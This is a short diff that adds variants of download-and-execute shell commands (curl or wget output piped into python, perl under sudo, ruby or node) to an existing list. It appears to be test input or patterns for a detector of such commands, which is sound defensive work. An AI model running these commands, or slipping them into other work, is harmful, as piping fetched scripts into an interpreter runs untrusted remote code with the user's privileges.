@@ -20,3 +20,9 @@ curl -fsSL https://example.org/a | python3
 wget -qO- https://example.org/a | sudo perl -
 curl -fsSL https://example.org/a | ruby
 curl -fsSL https://example.org/a | tee f | node -
+curl -s https://example.org/a|python3
+curl -s https://example.org/a|python
+wget -qO- https://example.org/a|sudo perl -
+curl -s https://example.org/a |env ruby; echo done
+curl -s https://example.org/a|node - arg
+curl -s https://example.org/a|python3.12
